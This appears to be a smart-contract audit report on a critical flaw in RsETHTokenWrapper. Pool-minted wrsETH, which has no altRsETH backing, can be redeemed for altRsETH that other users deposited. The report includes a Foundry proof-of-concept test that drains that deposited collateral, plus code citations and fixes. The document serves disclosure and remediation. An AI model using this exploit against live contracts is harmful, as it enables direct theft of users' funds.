### Title
Unbacked wrsETH minted via RSETHPoolV2/V3 can drain altRsETH deposited by `_deposit` users — (`contracts/L2/RsETHTokenWrapper.sol`)

---

### Summary

`RsETHTokenWrapper.mint()` creates wrsETH without depositing any altRsETH into the wrapper. `_withdraw()` allows any wrsETH holder to redeem altRsETH from the wrapper's balance with no check on how the wrsETH was obtained. An attacker who receives pool-minted wrsETH (backed only by ETH in the pool, not by altRsETH in the wrapper) can call `withdraw`/`withdrawTo` to drain altRsETH deposited by legitimate `_deposit` users.

---

### Finding Description

`RsETHTokenWrapper` has two distinct paths that produce wrsETH:

**Path 1 — collateral-backed:** `_deposit` pulls altRsETH from the caller into the wrapper and mints an equal amount of wrsETH. The wrapper's altRsETH balance grows 1:1 with supply. [1](#0-0) 

**Path 2 — ETH-backed (pool mint):** `RSETHPoolV2.deposit` / `RSETHPoolV3.deposit` call `wrsETH.mint(msg.sender, rsETHAmount)` directly. No altRsETH is deposited into the wrapper; the backing is ETH sitting in the pool, to be bridged to L1 later. [2](#0-1) [3](#0-2) 

`_withdraw` has only one guard — `allowedTokens[_asset]` — then burns wrsETH and transfers altRsETH from the wrapper's balance. It does **not** distinguish between wrsETH obtained via `_deposit` (altRsETH-backed) and wrsETH obtained via `mint()` (ETH-backed): [4](#0-3) 

This means pool-minted wrsETH can be redeemed for altRsETH that was deposited by other users, stealing their collateral.

---

### Impact Explanation

**Critical — direct theft of user funds.**

Any user who deposited altRsETH via `deposit`/`depositTo` has their altRsETH at risk. An attacker who deposits any amount of ETH into `RSETHPoolV2`/`RSETHPoolV3` receives wrsETH and can immediately call `wrapper.withdraw(altRsETH, amount)` to drain the wrapper's altRsETH balance up to the amount of wrsETH they hold. The attacker receives altRsETH (a yield-bearing LST) while the pool retains only ETH — a direct value extraction.

---

### Likelihood Explanation

**High.** The attack requires no special role, no governance action, and no oracle manipulation. The only prerequisite is:
1. `RSETHPoolV2`/`RSETHPoolV3` holds `MINTER_ROLE` on the wrapper (the intended production deployment).
2. At least one user has deposited altRsETH into the wrapper via `_deposit`.

Both conditions are normal operating state. The attacker needs only ETH to execute.

---

### Recommendation

Separate the two wrsETH issuance paths at the redemption layer. Options:

1. **Track pool-minted supply separately.** Maintain a `mintedByPool` counter; `_withdraw` should only allow redemption of altRsETH up to `altRsETH.balanceOf(address(this))` minus the unbacked pool-minted supply.
2. **Disallow `withdraw` for pool-minted wrsETH.** Require that `_withdraw` can only be called when `totalSupply() <= altRsETH.balanceOf(address(this))`, i.e., the wrapper is fully collateralised.
3. **Separate token types.** Issue a distinct token for pool deposits vs. altRsETH deposits, so pool-minted tokens cannot be redeemed for altRsETH.

---

### Proof of Concept

```solidity
// Fork test (L2 chain where RSETHPoolV2 has MINTER_ROLE on wrapper)
function testStealAltRsETH() public {
    // 1. Victim deposits altRsETH into wrapper
    uint256 victimAmount = 1e18;
    vm.startPrank(victim);
    altRsETH.approve(address(wrapper), victimAmount);
    wrapper.deposit(address(altRsETH), victimAmount);
    vm.stopPrank();

    // wrapper now holds victimAmount of altRsETH
    assertEq(altRsETH.balanceOf(address(wrapper)), victimAmount);

    // 2. Attacker deposits ETH into pool → receives wrsETH via mint()
    //    No altRsETH is deposited into the wrapper
    vm.deal(attacker, 1 ether);
    vm.startPrank(attacker);
    pool.deposit{value: 1 ether}("ref");
    uint256 attackerWrsETH = wrapper.balanceOf(attacker);
    assertGt(attackerWrsETH, 0);

    // 3. Attacker redeems wrsETH for victim's altRsETH
    uint256 stealAmount = attackerWrsETH < victimAmount ? attackerWrsETH : victimAmount;
    wrapper.withdraw(address(altRsETH), stealAmount);
    vm.stopPrank();

    // Attacker now holds altRsETH they never deposited
    assertEq(altRsETH.balanceOf(attacker), stealAmount);
    // Victim's altRsETH is gone from the wrapper
    assertLt(altRsETH.balanceOf(address(wrapper)), victimAmount);
}
```

The `_withdraw` call at line 123–125 succeeds because the only check is `allowedTokens[_asset]`, and the attacker holds valid wrsETH (obtained via `mint`, not `_deposit`). [5](#0-4)

### Citations

**File:** contracts/L2/RsETHTokenWrapper.sol (L120-128)
```text
    function _withdraw(address _asset, address _to, uint256 _amount) internal {
        if (!allowedTokens[_asset]) revert TokenNotAllowed();

        _burn(msg.sender, _amount);

        ERC20Upgradeable(_asset).safeTransfer(_to, _amount);

        emit Withdraw(_asset, msg.sender, _to, _amount);
    }
```

**File:** contracts/L2/RsETHTokenWrapper.sol (L134-141)
```text
    function _deposit(address _asset, address _to, uint256 _amount) internal {
        if (!allowedTokens[_asset]) revert TokenNotAllowed();

        ERC20Upgradeable(_asset).safeTransferFrom(msg.sender, address(this), _amount);

        _mint(_to, _amount);
        emit Deposit(_asset, msg.sender, _to, _amount);
    }
```

**File:** contracts/L2/RsETHTokenWrapper.sol (L190-192)
```text
    function mint(address _to, uint256 _amount) external onlyRole(MINTER_ROLE) {
        _mint(_to, _amount);
    }
```

**File:** contracts/pools/RSETHPoolV2.sol (L207-218)
```text
    function deposit(string memory referralId) external payable nonReentrant whenNotPaused limitDailyMint(msg.value) {
        uint256 amount = msg.value;

        if (amount == 0) revert InvalidAmount();

        (uint256 rsETHAmount, uint256 fee) = viewSwapRsETHAmountAndFee(amount);

        feeEarnedInETH += fee;

        wrsETH.mint(msg.sender, rsETHAmount);

        emit SwapOccurred(msg.sender, rsETHAmount, fee, referralId);
```
